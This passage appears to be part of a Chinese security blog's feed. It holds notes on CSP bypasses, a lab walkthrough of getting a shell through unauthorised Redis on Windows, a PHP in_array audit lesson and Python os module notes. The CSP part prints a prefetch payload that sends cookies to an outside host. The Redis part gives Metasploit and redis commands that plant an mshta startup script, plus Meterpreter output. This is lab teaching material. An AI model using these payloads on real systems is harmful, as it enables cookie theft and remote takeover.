href="http://xss.cc/the_only_allow_dir/%E8%BF%99%E4%B8%AA%E5%9F%9F%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8" target="_blank" rel="noopener">http://xss.cc/the_only_allow_dir/</a> 这个域，然后我们在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.cc/myjs/a.js</span><br></pre></td></tr></table></figure><p>​    写入js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&apos;uknow&apos;)</span><br></pre></td></tr></table></figure><p>​    这里我们测试就能成功了。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp_5.jpg" alt=""></p><h5><span id="csp拦截情况">CSP拦截情况</span></h5><ul><li>302跳转页面不在允许域内，比如<code>302.php</code>放在了站的根目录下，允许了<code>http://127.0.0.1/test/</code>这样是会被拦截的。</li><li>删除策略中的<code>http://xss.cc/the_only_allow_dir/</code> ,用302跳转到外域即<code>&lt;script src=&quot;/test.php?u=//xss.cc/myjs/a.js&quot;&gt;</code>这样也是会拦截的。</li><li>既然外域被允许了，那直接引用外域即<code>&lt;script src=&quot;//xss.cc/myjs/a.js&quot;&gt;</code>这样也是会被拦截的。</li></ul><h5><span id="总结">总结</span></h5><p>从以上的实验来看这个绕过是需要一定条件的，如下：</p><ul><li><code>script-uri</code>本地域内需要有一个302跳转页面可以利用，这种页面大多存在于登陆，退出登录。 </li><li><code>script-uri</code>的外域内可以构造一个恶意的<code>evil.js</code>。如果外域有一个文件上传漏洞，或者引用的CDN存在一个恶意的<code>evil.js</code>。</li></ul><h4><span id="link-bypass-unsafe-line">link Bypass unsafe line</span></h4><p>在 HTML5 中的一个新特性：页面资源预加载，他是浏览器提供的一个技巧，目的是让浏览器在空闲时间下载或预读取一些文档资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。 </p><p>经测试在<code>chrome</code>和<code>firefox</code>中<code>prefetch</code> 和<code>prerender</code>预加载一个页面这两种方法已经被拦截了。</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var n0t = document.createElement(&quot;link&quot;);</span><br><span class="line">n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">n0t.setAttribute(&quot;href&quot;, &quot;//xss.com/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(n0t)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;csp基础知识&quot;&gt;CSP基础知识&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;简介&quot;&gt;简介&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis在Windows环境下Getshell</title>
    <link href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html"/>
    <id>https://uknowsec.cn/posts/notes/Redis在Windows环境下Getshell.html</id>
    <published>2018-07-31T12:34:16.000Z</published>
    <updated>2019-01-07T08:24:15.307Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h3><span id="环境搭建">环境搭建</span></h3><p>windows版本redis:   <a href="https://github.com/MicrosoftArchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi" target="_blank" rel="noopener"><strong>Redis-x64-3.2.100.msi</strong></a></p><p>靶机环境： windows server 2012 </p><p>​            IP:   10.107.11.76</p><p>攻击环境： kali linux</p><p>​            IP:    10.107.10.77</p><h3><span id="模拟redis未授权环境">模拟redis未授权环境</span></h3><p>编辑<code>Redis</code>目录中的<code>redis.windows.conf</code>配置文件，如下设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure><p>这样我们就得到了一个未授权的环境。</p><h3><span id="模拟攻击">模拟攻击</span></h3><h4><span id="mshta-ps_shell">mshta PS_shell</span></h4><p>这里我们要用到<code>PS_shell.rb</code>这个脚本，下载地址如下：</p><p><a href="https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb" target="_blank" rel="noopener">PS_shell.rb</a></p><p>下载脚本放到<code>/usr/share/metasploit-framework/modules/exploits/windows/</code>目录下。</p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure><p>加载攻击脚本，然后执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/PS_shell</span><br><span class="line">msf exploit(windows/PS_shell) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/PS_shell):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8080             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/PS_shell) &gt; set uripath 123</span><br><span class="line">uripath =&gt; 123</span><br><span class="line"></span><br><span class="line">msf exploit(windows/PS_shell) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.107.10.77:4444 </span><br><span class="line">msf exploit(windows/PS_shell) &gt; [*] Using URL: http://0.0.0.0:8080/123</span><br><span class="line">[*] Local IP: http://10.107.10.77:8080/123</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE in an MS document:</span><br><span class="line">mshta.exe &quot;http://10.107.10.77:8080/123&quot;</span><br></pre></td></tr></table></figure><p>从以上结果来看我们只需要执行<code>mshta.exe &quot;http://10.107.10.77:8080/123&quot;</code>这个命令就可以得到一个反弹的shell了。</p><h4><span id="redis未授权写文件">redis未授权写文件</span></h4><p>这里我们回到<code>windows</code>版本下的<code>redis</code>。利用这个未授权进行写文件。</p><p>在<code>linux</code>环境下，<code>redis</code>未授权可以利用以下方法利用：</p><ul><li>保存到www目录，创建webshell</li><li>创建SSH authorized_keys文件</li><li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li><li>slave of 8.8.8.8主从模式利用</li><li>写入到/etc/profile.d/用户环境变量</li><li>开启AOF持久化纯文本记录appendfilename</li></ul><p>我们常用的就是前三种，但是在<code>windows</code>这些都是不成立的。</p><p>在网上找了不少资料，<code>windows</code>环境下的<code>redis</code>未授权利用的文章还是比较少的，可以利用的点就是<code>启动项</code>了，</p><p>但是还是比较鸡肋的，需要目标机器重启。</p><p>另外我在<code>T00ls.net</code>看到的有人回复有如下方法：</p><ol><li>lpk，sethc，启动项，mof，ink劫持</li><li>写个hta下载powershell执行写入文件 metasploit等管理员上线</li></ol><p>第一个对于<code>redis</code>未授权写文件来说到除启动项，其他的对于写文件来说都是比较麻烦的。</p><p>第二个就是还是麻烦的，既然可以利用<code>mshta</code>了就可以利用我上面说的<code>PS_shell.rb</code>这个脚本了。</p><p>这里还是利用<code>PS_shell.rb</code>生成一个恶意链接，利用<code>mshta</code>这个命令来执行这个恶意链接反弹一个shell。</p><p>执行命令最简单的就是用<code>bat</code>文件了。我们只需要写入一个<code>eval.bat</code>来执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe &quot;http://10.107.10.77:8080/123&quot;</span><br></pre></td></tr></table></figure><p>等待目标重启，我们就可以得到shell了。</p><p>写文件的时候需要注意的就是：<code>redis</code>写文件会自动生成一个<code>redis</code>版本信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REDIS0007?redis-ver3.2.100?redis-bits繞?ctime聤K][?used-mem篓? ? ?</span><br></pre></td></tr></table></figure><p>所以我们需要处理一下，在<code>bat</code>中每一行当做一条命令执行。这里我们需要换行，换行也要注意的是。这里要用到<code>\r\n</code>，而且一个<code>\r\n</code>是不行的。这里我们用两个或多个<code>\r\n</code>来进行换行。</p><p>未授权连接到<code>redis</code>，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# telnet 10.107.11.76 6379</span><br><span class="line">Trying 10.107.11.76...</span><br><span class="line">Connected to 10.107.11.76.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename 1.bat</span><br><span class="line">+OK</span><br><span class="line">config set dbfilename 1.bat</span><br><span class="line">+OK</span><br><span class="line">set x &quot;\r\n\r\nmshta http://10.107.10.77:8080/123\r\n\r\n&quot;</span><br><span class="line">+OK</span><br><span class="line">save </span><br><span class="line">+OK</span><br></pre></td></tr></table></figure><p>我们这边手动重启靶机，就可以反弹一个shell了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/PS_shell) &gt; </span><br><span class="line">[*] 10.107.11.76     PS_shell - Delivering payload</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.107.11.76</span><br><span class="line">[*] Meterpreter session 5 opened (10.107.10.77:4444 -&gt; 10.107.11.76:49160) at 2018-07-30 23:05:42 -0400</span><br><span class="line">sessions -i 5</span><br><span class="line">[*] Starting interaction with 5...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-HMRM0QMQ2QQ\Administrator</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h3&gt;&lt;span id=&quot;环境搭建&quot;&gt;环境搭建&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;windows版本redis:   &lt;a href=&quot;https://github.com/MicrosoftArchive/redis/releases/download/
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP SECURITY CALENDAR 2017</title>
    <link href="https://uknowsec.cn/posts/notes/PHP-SECURITY-CALENDAR-2017.html"/>
    <id>https://uknowsec.cn/posts/notes/PHP-SECURITY-CALENDAR-2017.html</id>
    <published>2018-07-18T05:52:14.000Z</published>
    <updated>2019-01-07T08:24:10.764Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="前言">前言</span></h2><p>今天在先知论坛看帖子发现了一个网站<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">php-security-calendar-2017</a></p><p>这个网站是一个PHP代码审计的网站，讲到的是PHP中一些函数的用法和注意。这里简单的记录下。</p><h3><span id="day-1-wish-list">Day 1 - Wish List</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Challenge &#123;</span><br><span class="line">    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;</span><br><span class="line">    private $file;</span><br><span class="line">    private $whitelist;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;whitelist = range(1, 24);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                $this-&gt;file[&apos;tmp_name&apos;],</span><br><span class="line">                self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</span><br></pre></td></tr></table></figure><p>这个题目说的是<code>in_array()</code>函数的问题</p><p>查看<code>in_array()</code>函数的定义</p><pre><code>in_array ：(PHP 4, PHP 5, PHP 7)功能 ：检查数组中是否存在某个值定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。</code></pre><p>在这个题目中用<code>in_array()</code>来检查文件名是为<code>range(1,24)</code>生成的数字。</p><p>但是在定义中的第三个参数没有设置为<code>TRUE</code>,所以这种检查是不严格的。</p><p>例如<code>1a</code>会被强制转换为<code>1</code>进行比较，也就有<code>1a=1</code>绕过检查。</p><p>在先知的帖子下面关于这个函数有一端代码关于<code>in_array</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(</span><br><span class="line">    &apos;egg&apos; =&gt; true,</span><br><span class="line">    &apos;cheese&apos; =&gt; false,</span><br><span class="line">    &apos;hair&apos; =&gt; 765,</span><br><span class="line">    &apos;goblins&apos; =&gt; null,</span><br><span class="line">    &apos;ogres&apos; =&gt; &apos;no ogres allowed in this array&apos;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// Loose checking -- return values are in comments</span><br><span class="line"></span><br><span class="line">// First three make sense, last four do not</span><br><span class="line"></span><br><span class="line">var_dump(in_array(null, $array)); // true</span><br><span class="line">var_dump(in_array(false, $array)); // true</span><br><span class="line">var_dump(in_array(765, $array)); // true</span><br><span class="line">var_dump(in_array(763, $array)); // true</span><br><span class="line">var_dump(in_array(&apos;egg&apos;, $array)); // true</span><br><span class="line">var_dump(in_array(&apos;hhh&apos;, $array)); // true</span><br><span class="line">var_dump(in_array(array(), $array)); // true</span><br><span class="line"></span><br><span class="line">// Strict checking</span><br><span class="line">var_dump(in_array(null, $array, true)); // true</span><br><span class="line">var_dump(in_array(false, $array, true)); // true</span><br><span class="line">var_dump(in_array(765, $array, true)); // true</span><br><span class="line">var_dump(in_array(763, $array, true)); // false</span><br><span class="line">var_dump(in_array(&apos;egg&apos;, $array, true)); // false</span><br><span class="line">var_dump(in_array(&apos;hhh&apos;, $array, true)); // false</span><br><span class="line">var_dump(in_array(array(), $array, true)); // false</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>所以在使用<code>in_array</code>函数时需要设置第三个参数进行严格的比较即对数据类型也进行比较。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;前言&quot;&gt;前言&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;今天在先知论坛看帖子发现了一个网站&lt;a href=&quot;https://www.ripstech.com/php-security-calendar-2017/&quot; target=&quot;_bl
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Python常用模块记录</title>
    <link href="https://uknowsec.cn/posts/notes/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E8%AE%B0%E5%BD%95.html"/>
    <id>https://uknowsec.cn/posts/notes/Python常用模块记录.html</id>
    <published>2018-07-07T12:03:09.000Z</published>
    <updated>2019-01-07T08:24:14.951Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="python-os模块">Python os模块</span></h2><p>os 模块提供了非常丰富的方法用来处理文件和目录。</p><h3><span id="权限">权限</span></h3><h4><span id="查看权限">查看权限</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os.access(path,mode)</span><br><span class="line"></span><br><span class="line">path:指定文件路径</span><br><span class="line">mode:参数参数有F_OK(是否存在),R_OK(可读),W_OK(可写),X_OK(可执行)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os                                                            </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.F_OK)           </span><br><span class="line">True                                                                                         </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.R_OK)           </span><br><span class="line">True                                                                     </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.W_OK)           </span><br><span class="line">True                                                                     </span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.X_OK)           </span><br><span class="line">True</span><br></pre></td></tr></table></figure><h4><span id="更改权限">更改权限</span></h4><p>os.chmod() 方法用于更改文件或目录的权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">os.chmod(path, mode)</span><br><span class="line"></span><br><span class="line">path -- 文件名路径或目录路径。</span><br><span class="line"> 权限指定：</span><br><span class="line">stat.S_IXOTH: 其他用户有执行权0o001</span><br><span class="line">stat.S_IWOTH: 其他用户有写权限0o002</span><br><span class="line">stat.S_IROTH: 其他用户有读权限0o004</span><br><span class="line">stat.S_IRWXO: 其他用户有全部权限(权限掩码)0o007</span><br><span class="line">stat.S_IXGRP: 组用户有执行权限0o010</span><br><span class="line">stat.S_IWGRP: 组用户有写权限0o020</span><br><span class="line">stat.S_IRGRP: 组用户有读权限0o040</span><br><span class="line">stat.S_IRWXG: 组用户有全部权限(权限掩码)0o070</span><br><span class="line">stat.S_IXUSR: 拥有者具有执行权限0o100</span><br><span class="line">stat.S_IWUSR: 拥有者具有写权限0o200</span><br><span class="line">stat.S_IRUSR: 拥有者具有读权限0o400</span><br><span class="line">stat.S_IRWXU: 拥有者有全部权限(权限掩码)0o700</span><br><span class="line">stat.S_ISVTX: 目录里文件目录只有拥有者才可删除更改0o1000</span><br><span class="line">stat.S_ISGID: 执行此文件其进程有效组为文件所在组0o2000</span><br><span class="line">stat.S_ISUID: 执行此文件其进程有效用户为文件所有者0o4000</span><br><span class="line">stat.S_IREAD: windows下设为只读</span><br><span class="line">stat.S_IWRITE: windows下取消只读</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.chmod(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,stat.S_IREAD)</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.W_OK)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.F_OK)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.X_OK)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; os.access(&apos;C:/Users/Think/Desktop/Python/test.py&apos;,os.R_OK)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h4><span id="更改所有者">更改所有者</span></h4><p>os.chown() 方法用于更改文件所有者，如果不修改可以设置为 -1, 你需要超级用户权限来执行权限修改操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chown()方法语法格式如下：</span><br><span class="line"></span><br><span class="line">os.chown(path, uid, gid);</span><br><span class="line"></span><br><span class="line">path -- 设置权限的文件路径</span><br><span class="line"></span><br><span class="line">uid -- 所属用户 ID</span><br><span class="line"></span><br><span class="line">gid -- 所属用户组 ID</span><br></pre></td></tr></table></figure><h3><span id="目录">目录</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.getcwd() #返回当前工作的目录</span><br><span class="line">&apos;C:\\Users\\Think\\Desktop&apos;</span><br><span class="line">&gt;&gt;&gt; os.listdir(&apos;.&apos;) #返回指定目录下所有的文件和目录名</span><br><span class="line">[&apos;file.txt&apos;, &apos;test&apos;, &apos;caidan.py&apos;, &apos;test.txt&apos;, &apos;test.py&apos;, &apos;test1.py&apos;, &apos;enumerate.py&apos;, &apos;login.py&apos;]</span><br><span class="line">&gt;&gt;&gt; os.remove(&apos;test1.py&apos;) #删除指定文件</span><br><span class="line">&gt;&gt;&gt; os.rmdir(&apos;aaa&apos;)  #删除指定目录</span><br><span class="line">&gt;&gt;&gt; os.mkdir(&apos;directory&apos;)  #创建目录，只能创建一层目录</span><br><span class="line">&gt;&gt;&gt; os.system(&apos;whoami&apos;)  #执行shell命令</span><br><span class="line">Think</span><br><span class="line">&gt;&gt;&gt; os.path.getmtime(&apos;.&apos;) #返回在此path下最后一次修改的时间戳</span><br><span class="line">1530964033.3031383</span><br></pre></td></tr></table></figure><h3><span id="文件">文件</span></h3><h4><span id="打开文件">打开文件</span></h4><p>os.open() 方法用于打开一个文件，并且设置需要的打开选项，模式参数mode参数是可选的，默认为 0777。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">os.open(file, flags[, mode]);</span><br><span class="line"></span><br><span class="line">file -- 要打开的文件</span><br><span class="line"></span><br><span class="line">flags -- 该参数可以是以下选项，多个使用 &quot;|&quot; 隔开：</span><br><span class="line"></span><br><span class="line">os.O_RDONLY: 以只读的方式打开</span><br><span class="line">os.O_WRONLY: 以只写的方式打开</span><br><span class="line">os.O_RDWR : 以读写的方式打开</span><br><span class="line">os.O_NONBLOCK: 打开时不阻塞</span><br><span class="line">os.O_APPEND: 以追加的方式打开</span><br><span class="line">os.O_CREAT: 创建并打开一个新文件</span><br><span class="line">os.O_TRUNC: 打开一个文件并截断它的长度为零（必须有写权限）</span><br><span class="line">os.O_EXCL: 如果指定的文件存在，返回错误</span><br><span class="line">os.O_SHLOCK: 自动获取共享锁</span><br><span class="line">os.O_EXLOCK: 自动获取独立锁</span><br><span class="line">os.O_DIRECT: 消除或减少缓存效果</span><br><span class="line">os.O_FSYNC : 同步写入</span><br><span class="line">os.O_NOFOLLOW: 不追踪软链接</span><br></pre></td></tr></table></figure><h3><span id="读取文件">读取文件</span></h3><p>os.read() 方法用于从文件描述符 fd 中读取最多 n 个字节，返回包含读取字节的字符串，文件描述符 fd对应文件已达到结尾, 返回一个空字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os.read(fd,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fd -- 文件描述符。</span><br><span class="line"></span><br><span class="line">n -- 读取的字节。</span><br></pre></td></tr></table></figure><h3><span id="删除文件">删除文件</span></h3><p>os.unlink() 方法用于删除文件,如果文件是一个目录则返回一个错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.unlink(path)</span><br><span class="line"></span><br><span class="line">path -- 删除的文件路径</span><br></pre></td></tr></table></figure><h2><span id="python-sys模块">Python sys模块</span></h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;python-os模块&quot;&gt;Python os模块&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;os 模块提供了非常丰富的方法用来处理文件和目录。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;权限&quot;&gt;权限&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span i
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Web中常见的绕过和技巧</title>
    <link href="https://uknowsec.cn/posts/notes/Web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93.html"/>
    <id>https://uknowsec.cn/posts/notes/Web中常见的绕过和技巧总结.html</id>
    <published>2018-06-06T14:07:40.000Z</published>
    <updated>2019-01-07T08:24:19.714Z</updated>
    
